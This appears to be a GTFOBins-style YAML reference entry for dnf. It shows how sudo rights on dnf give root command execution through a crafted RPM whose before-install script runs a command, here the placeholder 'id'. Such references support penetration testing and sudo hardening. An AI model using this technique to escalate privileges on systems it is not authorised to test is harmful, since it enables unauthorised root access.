---
functions:
  sudo:
    - description: |
        It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
        ```
        TF=$(mktemp -d)
        echo 'id' > $TF/x.sh
        fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
        ```
      code: |
        sudo dnf install -y x-1.0-1.noarch.rpm
---
